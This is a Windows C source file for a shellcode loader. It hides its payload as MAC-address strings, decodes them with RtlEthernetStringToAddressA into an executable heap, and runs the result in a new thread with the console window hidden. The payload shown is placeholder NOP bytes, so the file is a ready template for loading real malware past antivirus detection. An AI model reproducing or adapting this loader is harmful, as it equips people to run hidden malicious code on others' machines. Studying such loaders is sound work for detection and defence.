#include <Windows.h>
#include <stdio.h>
#include <Ip2string.h>
#pragma comment(lib, "Ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
int Error(const char* msg) {
	printf("%s (%u)", msg, GetLastError());
	return 1;
}

int main() {

    

    const char* MAC[] =
    {
        "90-90-90-90-90-90",
        "90-90-90-90-90-90",
        "90-90-90-90-90-90",
        "90-90-90-90-90-90",
        "90-90-90-90-90-90",
        "90-90-90-90-90-90",
        "90-90-90-90-90-90"
    };
    

    int rowLen = sizeof(MAC) / sizeof(MAC[0]);
	PCSTR Terminator = NULL;
	NTSTATUS STATUS;

	
	HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	void* alloc_mem = HeapAlloc(hHeap, 0, 0x1000);
	DWORD_PTR ptr = (DWORD_PTR)alloc_mem;
	
	for (int i = 0; i < rowLen; i++) {
		STATUS = RtlEthernetStringToAddressA((PCSTR)MAC[i], &Terminator, (DL_EUI48*)ptr);
		if (!NT_SUCCESS(STATUS)) {
			printf("[!] RtlEthernetStringToAddressA failed in %s result %x (%u)", MAC[i], STATUS, GetLastError());
			return FALSE;
		}
		ptr += 6;
	}
    
    
    
    
    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
    if (!tHandle) {
        printf("Failed to Create the thread (%u)\n", GetLastError());
        return -3;
    }

    WaitForSingleObject(tHandle, INFINITE);
    
    printf("alloc_mem\n", alloc_mem);
    getchar();
    
	return 0;

}



